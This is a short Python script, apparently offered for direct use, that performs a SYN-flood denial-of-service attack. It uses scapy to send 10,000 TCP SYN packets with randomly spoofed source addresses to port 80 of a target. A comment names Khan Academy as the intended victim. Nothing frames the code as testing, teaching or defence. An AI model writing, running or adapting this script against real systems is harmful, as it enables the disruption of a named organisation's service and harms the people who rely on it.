from scapy.all import *
import random

def dos_attack(target_ip, num_packets):
    for i in range(num_packets):
        # Generate a random source IP address
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        
        # Create a packet with the random source IP and target IP
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=80, flags="S")
        
        # Send the packet
        send(packet)

# Replace '192.168.1.100' with the IP address of Khan Academy
target_ip = '192.168.1.100'

# Set the number of packets to send
num_packets = 10000

# Perform the DoS attack
dos_attack(target_ip, num_packets)